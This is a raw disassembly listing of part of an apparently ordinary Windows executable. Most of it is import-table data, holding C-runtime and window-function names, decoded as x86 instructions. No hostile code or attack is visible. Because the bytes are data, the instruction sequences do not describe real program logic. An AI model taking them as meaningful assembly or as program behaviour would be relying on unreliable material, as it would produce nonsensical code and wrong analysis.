  4136c4:	sub    bh,BYTE PTR [edi]
  4136c6:	add    DWORD PTR [eax],eax
  4136c8:	cmp    BYTE PTR [edi],bh
  4136ca:	add    DWORD PTR [eax],eax
  4136cc:	dec    esi
  4136cd:	aas    
  4136ce:	add    DWORD PTR [eax],eax
  4136d0:	bound  edi,QWORD PTR [edi]
  4136d2:	add    DWORD PTR [eax],eax
  4136d4:	outs   dx,BYTE PTR ds:[esi]
  4136d5:	aas    
  4136d6:	add    DWORD PTR [eax],eax
  4136d8:	js     0x413719
  4136da:	add    DWORD PTR [eax],eax
  4136dc:	xchg   BYTE PTR [edi],bh
  4136de:	add    DWORD PTR [eax],eax
  4136e0:	xchg   esp,eax
  4136e1:	aas    
  4136e2:	add    DWORD PTR [eax],eax
  4136e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136e5:	aas    
  4136e6:	add    DWORD PTR [eax],eax
  4136e8:	mov    dh,0x3f
  4136ea:	add    DWORD PTR [eax],eax
  4136ec:	enter  0x13f,0x0
  4136f0:	fidivr DWORD PTR [edi]
  4136f2:	add    DWORD PTR [eax],eax
  4136f4:	in     al,dx
  4136f5:	aas    
  4136f6:	add    DWORD PTR [eax],eax
  4136f8:	clc    
  4136f9:	aas    
  4136fa:	add    DWORD PTR [eax],eax
  4136fc:	or     al,BYTE PTR [eax+0x1]
  4136ff:	add    BYTE PTR [edx],ah
  413701:	inc    eax
  413702:	add    DWORD PTR [eax],eax
  413704:	xor    al,0x40
  413706:	add    DWORD PTR [eax],eax
  413708:	dec    eax
  413709:	inc    eax
  41370a:	add    DWORD PTR [eax],eax
  41370c:	pop    edx
  41370d:	inc    eax
  41370e:	add    DWORD PTR [eax],eax
  413710:	fs inc eax
  413712:	add    DWORD PTR [eax],eax
  413714:	je     0x413756
  413716:	add    DWORD PTR [eax],eax
  413718:	add    BYTE PTR [eax+0x1],0x0
  41371c:	cwde   
  41371d:	inc    eax
  41371e:	add    DWORD PTR [eax],eax
  413720:	lods   al,BYTE PTR ds:[esi]
  413721:	inc    eax
  413722:	add    DWORD PTR [eax],eax
  413724:	mov    esp,0xca000140
  413729:	inc    eax
  41372a:	add    DWORD PTR [eax],eax
  41372c:	loopne 0x41376e
  41372e:	add    DWORD PTR [eax],eax
  413730:	lock inc eax
  413732:	add    DWORD PTR [eax],eax
  413734:	or     BYTE PTR [ecx+0x1],al
  413737:	add    BYTE PTR [esi],dl
  413739:	inc    ecx
  41373a:	add    DWORD PTR [eax],eax
  41373c:	sub    BYTE PTR [ecx+0x1],al
  41373f:	add    BYTE PTR [esi],dh
  413741:	inc    ecx
  413742:	add    DWORD PTR [eax],eax
  413744:	inc    esp
  413745:	inc    ecx
  413746:	add    DWORD PTR [eax],eax
  413748:	push   edx
  413749:	inc    ecx
  41374a:	add    DWORD PTR [eax],eax
  41374c:	pusha  
  41374d:	inc    ecx
  41374e:	add    DWORD PTR [eax],eax
  413750:	jo     0x413793
  413752:	add    DWORD PTR [eax],eax
  413754:	test   BYTE PTR [ecx+0x1],al
  413757:	add    BYTE PTR [edx-0x5ffffebf],dl
  41375d:	inc    ecx
  41375e:	add    DWORD PTR [eax],eax
  413760:	scas   al,BYTE PTR es:[edi]
  413761:	inc    ecx
  413762:	add    DWORD PTR [eax],eax
  413764:	mov    esi,0xd6000141
  413769:	inc    ecx
  41376a:	add    DWORD PTR [eax],eax
  41376c:	call   0xfa4138b2
  413771:	inc    ecx
  413772:	add    DWORD PTR [eax],eax
  413774:	push   es
  413775:	inc    edx
  413776:	add    DWORD PTR [eax],eax
  413778:	sbb    BYTE PTR [edx+0x1],al
  41377b:	add    BYTE PTR [esi],ch
  41377d:	inc    edx
  41377e:	add    DWORD PTR [eax],eax
  413780:	cmp    al,BYTE PTR [edx+0x1]
  413783:	add    BYTE PTR [esi+0x42],cl
  413786:	add    DWORD PTR [eax],eax
  413788:	pusha  
  413789:	inc    edx
  41378a:	add    DWORD PTR [eax],eax
  41378c:	add    BYTE PTR [eax],al
  41378e:	add    BYTE PTR [eax],al
  413790:	add    BYTE PTR [edx+0x1],0x0
  413794:	cwde   
  413795:	inc    edx
  413796:	add    DWORD PTR [eax],eax
  413798:	scas   al,BYTE PTR es:[edi]
  413799:	inc    edx
  41379a:	add    DWORD PTR [eax],eax
  41379c:	mov    edx,0xca000142
  4137a1:	inc    edx
  4137a2:	add    DWORD PTR [eax],eax
  4137a4:	fadd   QWORD PTR [edx+0x1]
  4137a7:	add    ah,ch
  4137a9:	inc    edx
  4137aa:	add    DWORD PTR [eax],eax
  4137ac:	clc    
  4137ad:	inc    edx
  4137ae:	add    DWORD PTR [eax],eax
  4137b0:	push   cs
  4137b1:	inc    ebx
  4137b2:	add    DWORD PTR [eax],eax
  4137b4:	sbb    BYTE PTR [ebx+0x1],al
  4137b7:	add    BYTE PTR [ebx+eax*2],ah
  4137ba:	add    DWORD PTR [eax],eax
  4137bc:	xor    al,BYTE PTR [ebx+0x1]
  4137bf:	add    BYTE PTR [edx+0x43],al
  4137c2:	add    DWORD PTR [eax],eax
  4137c4:	push   eax
  4137c5:	inc    ebx
  4137c6:	add    DWORD PTR [eax],eax
  4137c8:	pop    edx
  4137c9:	inc    ebx
  4137ca:	add    DWORD PTR [eax],eax
  4137cc:	outs   dx,BYTE PTR ds:[esi]
  4137cd:	inc    ebx
  4137ce:	add    DWORD PTR [eax],eax
  4137d0:	test   BYTE PTR [ebx+0x1],al
  4137d3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4137da:	add    DWORD PTR [eax],eax
  4137dc:	mov    eax,0xcc000143
  4137e1:	inc    ebx
  4137e2:	add    DWORD PTR [eax],eax
  4137e4:	fiadd  DWORD PTR [ebx+0x1]
  4137e7:	add    dl,ch
  4137e9:	inc    ebx
  4137ea:	add    DWORD PTR [eax],eax
  4137ec:	clc    
  4137ed:	inc    ebx
  4137ee:	add    DWORD PTR [eax],eax
  4137f0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4137f4:	adc    al,0x44
  4137f6:	add    DWORD PTR [eax],eax
  4137f8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4137fc:	xor    al,0x44
  4137fe:	add    DWORD PTR [eax],eax
  413800:	inc    esi
  413801:	inc    esp
  413802:	add    DWORD PTR [eax],eax
  413804:	pop    edx
  413805:	inc    esp
  413806:	add    DWORD PTR [eax],eax
  413808:	inc    sp
  41380a:	add    DWORD PTR [eax],eax
  41380c:	jbe    0x413852
  41380e:	add    DWORD PTR [eax],eax
  413810:	mov    es,WORD PTR [ecx+eax*1+0x0]
  413814:	sahf   
  413815:	inc    esp
  413816:	add    DWORD PTR [eax],eax
  413818:	scas   al,BYTE PTR es:[edi]
  413819:	inc    esp
  41381a:	add    DWORD PTR [eax],eax
  41381c:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413821:	inc    esp
  413822:	add    DWORD PTR [eax],eax
  413824:	in     al,dx
  413825:	inc    esp
  413826:	add    DWORD PTR [eax],eax
  413828:	clc    
  413829:	inc    esp
  41382a:	add    DWORD PTR [eax],eax
  41382c:	or     al,BYTE PTR [ebp+0x1]
  41382f:	add    BYTE PTR [esi],bl
  413831:	inc    ebp
  413832:	add    DWORD PTR [eax],eax
  413834:	sub    BYTE PTR [ebp+0x1],al
  413837:	add    BYTE PTR [eax],bh
  413839:	inc    ebp
  41383a:	add    DWORD PTR [eax],eax
  41383c:	inc    esp
  41383d:	inc    ebp
  41383e:	add    DWORD PTR [eax],eax
  413840:	dec    esi
  413841:	inc    ebp
  413842:	add    DWORD PTR [eax],eax
  413844:	pop    edx
  413845:	inc    ebp
  413846:	add    DWORD PTR [eax],eax
  413848:	add    BYTE PTR [eax],al
  41384a:	add    BYTE PTR [eax],al
  41384c:	jbe    0x413893
  41384e:	add    DWORD PTR [eax],eax
  413850:	mov    BYTE PTR [ebp+0x1],al
  413853:	add    BYTE PTR [eax-0x51fffebb],ah
  413859:	inc    ebp
  41385a:	add    DWORD PTR [eax],eax
  41385c:	retf   0x145
  41385f:	add    ah,bl
  413861:	inc    ebp
  413862:	add    DWORD PTR [eax],eax
  413864:	in     al,dx
  413865:	inc    ebp
  413866:	add    DWORD PTR [eax],eax
  413868:	add    BYTE PTR [esi+0x1],al
  41386b:	add    BYTE PTR [eax],bl
  41386d:	inc    esi
  41386e:	add    DWORD PTR [eax],eax
  413870:	sub    al,BYTE PTR [esi+0x1]
  413873:	add    BYTE PTR [esi],dh
  413875:	inc    esi
  413876:	add    DWORD PTR [eax],eax
  413878:	dec    edx
  413879:	inc    esi
  41387a:	add    DWORD PTR [eax],eax
  41387c:	pusha  
  41387d:	inc    esi
  41387e:	add    DWORD PTR [eax],eax
  413880:	ins    BYTE PTR es:[edi],dx
  413881:	inc    esi
  413882:	add    DWORD PTR [eax],eax
  413884:	add    BYTE PTR [esi+0x1],0x0
  413888:	xchg   esp,eax
  413889:	inc    esi
  41388a:	add    DWORD PTR [eax],eax
  41388c:	mov    al,ds:0xae000146
  413891:	inc    esi
  413892:	add    DWORD PTR [eax],eax
  413894:	ret    0x146
  413897:	add    dl,bl
  413899:	inc    esi
  41389a:	add    DWORD PTR [eax],eax
  41389c:	call   0xf24139e7
  4138a1:	inc    esi
  4138a2:	add    DWORD PTR [eax],eax
  4138a4:	inc    BYTE PTR [esi+0x1]
  4138a7:	add    BYTE PTR [esi],cl
  4138a9:	inc    edi
  4138aa:	add    DWORD PTR [eax],eax
  4138ac:	and    al,0x47
  4138ae:	add    DWORD PTR [eax],eax
  4138b0:	cmp    al,BYTE PTR [edi+0x1]
  4138b3:	add    BYTE PTR [edi+eax*2+0x1],cl
  4138b7:	add    BYTE PTR [edx+0x47],bl
  4138ba:	add    DWORD PTR [eax],eax
  4138bc:	push   0x47
  4138be:	add    DWORD PTR [eax],eax
  4138c0:	jle    0x413909
  4138c2:	add    DWORD PTR [eax],eax
  4138c4:	xchg   esi,eax
  4138c5:	inc    edi
  4138c6:	add    DWORD PTR [eax],eax
  4138c8:	mov    ds:0xba000147,al
  4138cd:	inc    edi
  4138ce:	add    DWORD PTR [eax],eax
  4138d0:	int3   
  4138d1:	inc    edi
  4138d2:	add    DWORD PTR [eax],eax
  4138d4:	fadd   QWORD PTR [edi+0x1]
  4138d7:	add    al,dh
  4138d9:	inc    edi
  4138da:	add    DWORD PTR [eax],eax
  4138dc:	push   es
  4138dd:	dec    eax
  4138de:	add    DWORD PTR [eax],eax
  4138e0:	sbb    cl,BYTE PTR [eax+0x1]
  4138e3:	add    BYTE PTR [eax],ch
  4138e5:	dec    eax
  4138e6:	add    DWORD PTR [eax],eax
  4138e8:	cmp    cl,BYTE PTR [eax+0x1]
  4138eb:	add    BYTE PTR [eax+0x48],cl
  4138ee:	add    DWORD PTR [eax],eax
  4138f0:	push   esp
  4138f1:	dec    eax
  4138f2:	add    DWORD PTR [eax],eax
  4138f4:	outs   dx,BYTE PTR ds:[esi]
  4138f5:	dec    eax
  4138f6:	add    DWORD PTR [eax],eax
  4138f8:	mov    BYTE PTR [eax+0x1],cl
  4138fb:	add    BYTE PTR [eax-0x59fffeb8],bl
  413901:	dec    eax
  413902:	add    DWORD PTR [eax],eax
  413904:	mov    dl,0x48
  413906:	add    DWORD PTR [eax],eax
  413908:	ror    BYTE PTR [eax+0x1],0x0
  41390c:	(bad)  
  41390d:	dec    eax
  41390e:	add    DWORD PTR [eax],eax
  413910:	add    BYTE PTR [eax],al
  413912:	add    BYTE PTR [eax],al
  413914:	lock dec eax
  413916:	add    DWORD PTR [eax],eax
  413918:	dec    BYTE PTR [eax+0x1]
  41391b:	add    BYTE PTR [esi],cl
  41391d:	dec    ecx
  41391e:	add    DWORD PTR [eax],eax
  413920:	push   ds
  413921:	dec    ecx
  413922:	add    DWORD PTR [eax],eax
  413924:	cs dec ecx
  413926:	add    DWORD PTR [eax],eax
  413928:	add    BYTE PTR [eax],al
  41392a:	add    BYTE PTR [eax],al
  41392c:	push   eax
  41392d:	dec    ecx
  41392e:	add    DWORD PTR [eax],eax
  413930:	add    BYTE PTR [eax],al
  413932:	add    BYTE PTR [eax],al
  413934:	cmc    
  413935:	add    BYTE PTR [edi+0x63],bl
  413938:	outs   dx,DWORD PTR ds:[esi]
  413939:	outs   dx,BYTE PTR ds:[esi]
  41393a:	je     0x4139ae
  41393c:	outs   dx,DWORD PTR ds:[esi]
  41393d:	ins    BYTE PTR es:[edi],dx
  41393e:	data16 jo 0x413941
  413941:	add    BYTE PTR [ebp+0x3],bl
  413944:	arpl   WORD PTR [ecx+0x6c],sp
  413947:	ins    BYTE PTR es:[edi],dx
  413948:	outs   dx,DWORD PTR ds:[esi]
  413949:	arpl   WORD PTR [eax],ax
  41394b:	add    BYTE PTR [edx+0x3],dh
  41394e:	data16 ins BYTE PTR es:[edi],dx
  413950:	outs   dx,DWORD PTR ds:[esi]
  413951:	outs   dx,DWORD PTR ds:[esi]
  413952:	jb     0x413954
  413954:	push   ds
  413955:	add    al,0x77
  413957:	arpl   WORD PTR [ebx+0x63],si
  41395a:	push   0xb000072
  41395f:	add    al,0x74
  413961:	outs   dx,DWORD PTR ds:[esi]
  413962:	ja     0x4139d0
  413964:	outs   dx,DWORD PTR ds:[esi]
  413965:	ja     0x4139cc
  413967:	jb     0x413969
  413969:	add    BYTE PTR [ebx+0x735f5f00],dh
  41396f:	gs je  0x4139d1
  413972:	popa   
  413973:	jo     0x4139e5
  413975:	pop    edi
  413976:	je     0x4139f1
  413978:	jo     0x4139df
  41397a:	add    BYTE PTR [eax],al
  41397c:	in     eax,0x3
  41397e:	jae    0x4139f4
  413980:	jb     0x4139e5
  413982:	push   0xa0000072
  413987:	add    BYTE PTR [edi+0x5f],bl
  41398a:	jo     0x4139eb
  41398c:	pop    edi
  41398d:	ins    WORD PTR es:[edi],dx
  41398f:	outs   dx,DWORD PTR ds:[esi]
  413990:	fs add BYTE PTR gs:[eax],al
  413994:	int3   
  413995:	add    esi,DWORD PTR [ecx+0x73]
  413998:	outs   dx,DWORD PTR ds:[esi]
  413999:	jb     0x413a0f
  41399b:	add    BYTE PTR [ebx+0x77736903],ch
  4139a1:	js     0x413a07
  4139a3:	imul   esp,DWORD PTR [edi+0x69],0x3a00074
  4139aa:	imul   esi,DWORD PTR [ebx+0x77],0x68706c61
  4139b1:	popa   
  4139b2:	add    BYTE PTR [eax],al
  4139b4:	fwait
  4139b5:	add    BYTE PTR [edi+0x5f],bl
  4139b8:	jo     0x413a19
  4139ba:	pop    edi
  4139bb:	arpl   WORD PTR [edi+0x6d],bp
  4139be:	ins    DWORD PTR es:[edi],dx
  4139bf:	outs   dx,DWORD PTR ds:[esi]
  4139c0:	fs add BYTE PTR gs:[eax],al
  4139c4:	sub    BYTE PTR [edi+esi*2],al
  4139c7:	arpl   WORD PTR [ebx+0x6e],si
  4139ca:	arpl   WORD PTR [ebp+0x70],bp
  4139cd:	add    BYTE PTR [ebp+0x3],bh
  4139d0:	data16 jb 0x413a38
  4139d3:	add    BYTE PTR gs:[eax],al
  4139d6:	or     al,0x4
  4139d8:	je     0x413a49
  4139da:	ja     0x413a51
  4139dc:	jo     0x413a4e
  4139de:	gs jb  0x4139e1
  4139e1:	add    BYTE PTR [ecx+0x3],bh
  4139e4:	data16 jo 0x413a5c
  4139e7:	je     0x413a5c
  4139e9:	add    BYTE PTR [ebp+0x74656703],cl
  4139ef:	outs   dx,BYTE PTR gs:[esi]
  4139f1:	jbe    0x4139f3
  4139f3:	add    BYTE PTR [eax+0x3],ah
  4139f6:	arpl   WORD PTR [edi+ebp*2+0x63],bp
  4139fa:	imul   eax,DWORD PTR [eax],0xffffffff
  4139fd:	add    esi,DWORD PTR [ebx+0x77]
  413a00:	jo     0x413a74
  413a02:	imul   ebp,DWORD PTR [esi+0x74],0xc8000066
  413a09:	add    esi,DWORD PTR [eax+0x75]
  413a0c:	je     0x413a71
  413a0e:	push   0xc9007261
  413a13:	add    esi,DWORD PTR [eax+0x75]
  413a16:	je     0x413a8b
  413a18:	add    BYTE PTR [eax],al
  413a1a:	mov    ecx,0x74626d03
  413a1f:	outs   dx,DWORD PTR ds:[esi]
  413a20:	ja     0x413a85
  413a22:	add    BYTE PTR [eax],al
  413a24:	test   eax,0x77736903
  413a29:	jae    0x413a9b
  413a2b:	popa   
  413a2c:	arpl   WORD PTR [ebp+0x0],sp
  413a2f:	add    BYTE PTR [ecx],cl
  413a31:	add    al,0x74
  413a33:	outs   dx,DWORD PTR ds:[esi]
  413a34:	ins    BYTE PTR es:[edi],dx
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	ja     0x413a9d
  413a38:	jb     0x413a3a
  413a3a:	fild   DWORD PTR [eax]
  413a3c:	pop    edi
  413a3d:	popa   
  413a3e:	ins    DWORD PTR es:[edi],dx
  413a3f:	jae    0x413aa8
  413a41:	pop    edi
  413a42:	gs js  0x413aae
  413a45:	je     0x413a47
  413a47:	add    ch,al
  413a49:	add    esi,DWORD PTR [eax+0x72]
  413a4c:	imul   ebp,DWORD PTR [esi+0x74],0x86000066
  413a53:	add    DWORD PTR [edi+0x69],ebx
  413a56:	outs   dx,BYTE PTR ds:[esi]
  413a57:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x9e006d72
  413a5f:	add    DWORD PTR [edi+0x69],ebx
  413a62:	jae    0x413ad1
  413a64:	bound  esp,QWORD PTR [edx+0x6c]
  413a67:	gs popa 
  413a69:	add    BYTE PTR fs:[eax],al
  413a6c:	push   edx
  413a6d:	add    BYTE PTR [edi+0x58],bl
  413a70:	arpl   WORD PTR [eax+0x74],si
  413a73:	inc    esi
  413a74:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3f10072
  413a7c:	jae    0x413af2
  413a7e:	jb     0x413aee
  413a80:	arpl   WORD PTR [ebp+0x70],bp
  413a83:	add    dl,dl
  413a85:	add    esi,DWORD PTR [edx+0x65]
  413a88:	ins    DWORD PTR es:[edi],dx
  413a89:	outs   dx,DWORD PTR ds:[esi]
  413a8a:	jbe    0x413af1
  413a8c:	add    BYTE PTR [eax],al
  413a8e:	cld    
  413a8f:	add    esi,DWORD PTR [ebx+0x74]
  413a92:	jb     0x413b08
  413a94:	outs   dx,DWORD PTR ds:[esi]
  413a95:	ins    BYTE PTR es:[edi],dx
  413a96:	add    BYTE PTR [eax],al
  413a98:	and    eax,0x73637704
  413a9d:	ins    BYTE PTR es:[edi],dx
  413a9e:	outs   dx,BYTE PTR gs:[esi]
  413aa0:	add    BYTE PTR [eax],al
  413aa2:	and    eax,DWORD PTR [ecx]
  413aa4:	pop    edi
  413aa5:	gs js  0x413b11
  413aa8:	je     0x413aaa
  413aaa:	call   0x65a499af
  413aaf:	js     0x413b1a
  413ab1:	je     0x413ab3
  413ab3:	add    BYTE PTR [ebp+0x73736903],bl
  413ab9:	jo     0x413b1c
  413abb:	arpl   WORD PTR [ebp+0x0],sp
  413abe:	call   0x72b5adc6
  413ac3:	arpl   WORD PTR [eax+0x79],si
  413ac6:	add    BYTE PTR [eax],al
  413ac8:	mov    ch,0x0
  413aca:	pop    edi
  413acb:	pop    edi
  413acc:	jae    0x413b33
  413ace:	je     0x413b45
  413ad0:	jae    0x413b37
  413ad2:	jb     0x413b41
  413ad4:	popa   
  413ad5:	je     0x413b3f
  413ad7:	gs jb  0x413b4c
  413ada:	add    BYTE PTR [eax],al
  413adc:	repnz add esi,DWORD PTR [ebx+0x74]
  413ae0:	jb     0x413b50
  413ae2:	arpl   WORD PTR [eax+0x79],si
  413ae5:	add    BYTE PTR [ebx+eax*1+0x64777369],ah
  413aec:	imul   esp,DWORD PTR [edi+0x69],0xa3000074
  413af3:	add    ebp,DWORD PTR [ecx+0x73]
  413af6:	ja     0x413b5b
  413af8:	je     0x413b73
  413afa:	jo     0x413b61
  413afc:	add    BYTE PTR [eax],al
  413afe:	mov    ch,0x3
  413b00:	ins    DWORD PTR es:[edi],dx
  413b01:	popa   
  413b02:	ins    BYTE PTR es:[edi],dx
  413b03:	ins    BYTE PTR es:[edi],dx
  413b04:	outs   dx,DWORD PTR ds:[esi]
  413b05:	arpl   WORD PTR [eax],ax
  413b07:	add    BYTE PTR [edx+0x0],dh
  413b0a:	pop    edi
  413b0b:	pop    edi
  413b0c:	addr16 gs je 0x413b7d
  413b10:	popa   
  413b11:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413b18:	add    DWORD PTR [ebx+esi*2],eax
  413b1b:	ja     0x413b90
  413b1d:	arpl   WORD PTR [ecx+0x6e],sp
  413b20:	data16 add BYTE PTR [ebp+0x53],cl
  413b24:	push   esi
  413b25:	inc    ebx
  413b26:	push   edx
  413b27:	push   esp
  413b28:	cs fs ins BYTE PTR es:[edi],dx
  413b2b:	ins    BYTE PTR es:[edi],dx
  413b2c:	add    BYTE PTR [eax],al
  413b2e:	xor    eax,0x74654701
  413b33:	dec    ebp
  413b34:	outs   dx,BYTE PTR gs:[esi]
  413b36:	jne    0x413b81
  413b38:	je     0x413b9f
  413b3a:	ins    DWORD PTR es:[edi],dx
  413b3b:	dec    ecx
  413b3c:	outs   dx,BYTE PTR ds:[esi]
  413b3d:	outs   dx,WORD PTR ds:[esi]
  413b3f:	push   edi
  413b40:	add    BYTE PTR [eax],al
  413b42:	sub    BYTE PTR [ecx],al
  413b44:	inc    edi
  413b45:	gs je  0x413b94
  413b48:	popa   
  413b49:	jae    0x413bbf
  413b4b:	inc    ecx
  413b4c:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413b50:	gs push eax
  413b52:	outs   dx,DWORD PTR ds:[esi]
  413b53:	jo     0x413bca
  413b55:	jo     0x413b57
  413b57:	add    dl,ah
  413b59:	add    BYTE PTR [esi+0x69],al
  413b5c:	outs   dx,BYTE PTR ds:[esi]
  413b5d:	fs push edi
  413b5f:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [ebp+0x1],bh
  413b6a:	dec    eax
  413b6b:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x74657261
  413b73:	add    BYTE PTR [esi+0x1],ah
  413b76:	inc    edi
  413b77:	gs je  0x413bcf
  413b7a:	jae    0x413be1
  413b7c:	jb     0x413bcd
  413b7e:	bound  ebp,QWORD PTR [edx+0x65]
  413b81:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  413b85:	outs   dx,WORD PTR ds:[esi]
  413b87:	jb     0x413bf6
  413b89:	popa   
  413b8a:	je     0x413bf5
  413b8c:	outs   dx,DWORD PTR ds:[esi]
  413b8d:	outs   dx,BYTE PTR ds:[esi]
  413b8e:	push   edi
  413b8f:	add    ch,bl
  413b91:	add    BYTE PTR [ebp+0x71],al
  413b94:	jne    0x413bf7
  413b96:	ins    BYTE PTR es:[edi],dx
  413b97:	push   edx
  413b98:	arpl   WORD PTR gs:[eax+eax*1-0x6c],si
  413b9d:	add    dl,BYTE PTR [edx+esi*2+0x61]
  413ba1:	outs   dx,BYTE PTR ds:[esi]
  413ba2:	jae    0x413c10
  413ba4:	popa   
  413ba5:	je     0x413c0c
  413ba7:	inc    ecx
  413ba8:	arpl   WORD PTR [ebx+0x65],sp
  413bab:	ins    BYTE PTR es:[edi],dx
  413bac:	gs jb  0x413c10
  413baf:	je     0x413c20
  413bb1:	jb     0x413c0a
  413bb3:	add    BYTE PTR [esi],bh
  413bb5:	add    BYTE PTR [ebx+0x68],al
  413bb8:	imul   ebp,DWORD PTR [esp+eiz*2+0x57],0x6f646e69
  413bc0:	ja     0x413c08
  413bc2:	jb     0x413c33
  413bc4:	ins    DWORD PTR es:[edi],dx
  413bc5:	push   eax
  413bc6:	outs   dx,DWORD PTR ds:[esi]
  413bc7:	imul   ebp,DWORD PTR [esi+0x74],0x28a0000
  413bce:	push   esp
  413bcf:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  413bd7:	ja     0x413c4c
  413bd9:	add    BYTE PTR [esi+0x616f4c01],dh
  413bdf:	fs dec ebp
  413be1:	outs   dx,BYTE PTR gs:[esi]
  413be3:	jne    0x413c26
  413be5:	add    al,al
  413be7:	add    BYTE PTR [ebp+0x6e],al
  413bea:	popa   
  413beb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  413bef:	arpl   WORD PTR [edx+0x6f],si
  413bf2:	ins    BYTE PTR es:[edi],dx
  413bf3:	ins    BYTE PTR es:[edi],dx
  413bf4:	inc    edx
  413bf5:	popa   
  413bf6:	jb     0x413bf8
  413bf8:	xor    al,BYTE PTR [ecx]
  413bfa:	inc    edi
  413bfb:	gs je  0x413c4b
  413bfe:	outs   dx,BYTE PTR gs:[esi]
  413c00:	jne    0x413c4b
  413c02:	je     0x413c69
  413c04:	ins    DWORD PTR es:[edi],dx
  413c05:	inc    ebx
  413c06:	outs   dx,DWORD PTR ds:[esi]
  413c07:	jne    0x413c77
  413c09:	je     0x413c0b
  413c0b:	add    cl,ah
  413c0d:	add    BYTE PTR [esi+0x69],al
  413c10:	outs   dx,BYTE PTR ds:[esi]
  413c11:	fs push edi
  413c13:	imul   ebp,DWORD PTR [esi+0x64],0x41776f
  413c1a:	rol    BYTE PTR [ecx],1
  413c1c:	dec    ebp
  413c1d:	gs jae 0x413c93
  413c20:	popa   
  413c21:	addr16 gs inc edx
  413c24:	outs   dx,DWORD PTR ds:[esi]
  413c25:	js     0x413c6c
  413c27:	js     0x413c80
  413c29:	add    BYTE PTR [eax+0x536e4901],al
  413c2f:	outs   dx,BYTE PTR gs:[esi]
  413c31:	fs dec ebp
  413c33:	gs jae 0x413ca9
  413c36:	popa   
  413c37:	addr16 gs add al,bl
  413c3b:	add    DWORD PTR [ebp+0x6f],ecx
  413c3e:	outs   dx,BYTE PTR ds:[esi]
  413c3f:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  413c47:	push   eax
  413c48:	outs   dx,DWORD PTR ds:[esi]
  413c49:	imul   ebp,DWORD PTR [esi+0x74],0x1680000
  413c50:	inc    edi
  413c51:	gs je  0x413cab
  413c54:	imul   ebp,DWORD PTR [esi+0x64],0x7d00776f
  413c5b:	add    dl,BYTE PTR [ebx+0x68]
  413c5e:	outs   dx,DWORD PTR ds:[esi]
  413c5f:	ja     0x413cb4
  413c61:	arpl   WORD PTR [edx+0x6f],si
  413c64:	ins    BYTE PTR es:[edi],dx
  413c65:	ins    BYTE PTR es:[edi],dx
  413c66:	inc    edx
  413c67:	popa   
  413c68:	jb     0x413c6a
  413c6a:	mov    cl,0x1
  413c6c:	dec    esp
  413c6d:	outs   dx,DWORD PTR ds:[esi]
  413c6e:	popa   
  413c6f:	fs dec ecx
  413c71:	ins    DWORD PTR es:[edi],dx
  413c72:	popa   
  413c73:	addr16 gs inc ecx
  413c76:	add    BYTE PTR [eax],al
  413c78:	cdq    
  413c79:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413c7d:	ins    BYTE PTR es:[edi],dx
  413c7e:	outs   dx,DWORD PTR ds:[esi]
  413c7f:	addr16 inc edx
  413c81:	outs   dx,DWORD PTR ds:[esi]
  413c82:	js     0x413ccd
  413c84:	outs   dx,BYTE PTR ds:[esi]
  413c85:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  413c8d:	jb     0x413cf0
  413c8f:	ins    DWORD PTR es:[edi],dx
  413c90:	inc    ecx
  413c91:	add    ch,al
  413c93:	add    DWORD PTR [ebp+0x61],ecx
  413c96:	jo     0x413cee
  413c98:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413c9f:	gs jns 0x413ce3
  413ca2:	add    BYTE PTR [eax],al
  413ca4:	sbb    BYTE PTR [edx],al
  413ca6:	push   edx
  413ca7:	gs ins DWORD PTR es:[edi],dx
  413ca9:	outs   dx,DWORD PTR ds:[esi]
  413caa:	jbe    0x413d11
  413cac:	push   eax
  413cad:	jb     0x413d1e
  413caf:	jo     0x413d08
  413cb1:	add    BYTE PTR [ecx+eax*1+0x47],ah
  413cb5:	gs je  0x413d0d
  413cb8:	jo     0x413d1e
  413cba:	popa   
  413cbb:	je     0x413d22
  413cbd:	push   edx
  413cbe:	outs   dx,BYTE PTR ds:[si]
  413cc0:	add    BYTE PTR [eax],al
  413cc2:	add    al,BYTE PTR [edx]
  413cc4:	push   edx
  413cc5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  413cce:	popa   
  413ccf:	jae    0x413d44
  413cd1:	inc    ecx
  413cd2:	add    BYTE PTR [eax],al
  413cd4:	add    dl,BYTE PTR ds:[ebx+0x65]
  413cd8:	je     0x413d1e
  413cda:	ins    BYTE PTR es:[edi],dx
  413cdb:	addr16 dec ecx
  413cdd:	je     0x413d44
  413cdf:	ins    DWORD PTR es:[edi],dx
  413ce0:	push   esp
  413ce1:	gs js  0x413d58
  413ce4:	inc    ecx
  413ce5:	add    BYTE PTR [ebp+0x61724400],dh
  413ceb:	ja     0x413d3a
  413ced:	outs   dx,BYTE PTR gs:[esi]
  413cef:	jne    0x413d33
  413cf1:	popa   
  413cf2:	jb     0x413cf4
  413cf4:	sub    eax,DWORD PTR [ecx]
  413cf6:	inc    edi
  413cf7:	gs je  0x413d47
  413cfa:	outs   dx,BYTE PTR gs:[esi]
  413cfc:	jne    0x413cfe
  413cfe:	repnz add DWORD PTR [eax+0x6f],edx
  413d02:	jae    0x413d78
  413d04:	dec    ebp
  413d05:	gs jae 0x413d7b
  413d08:	popa   
  413d09:	addr16 gs push edi
  413d0c:	add    BYTE PTR [eax],al
  413d0e:	push   cs
  413d0f:	add    DWORD PTR [edi+0x65],eax
  413d12:	je     0x413d58
  413d14:	ins    BYTE PTR es:[edi],dx
  413d15:	addr16 inc ebx
  413d17:	je     0x413d8b
  413d19:	ins    BYTE PTR es:[edi],dx
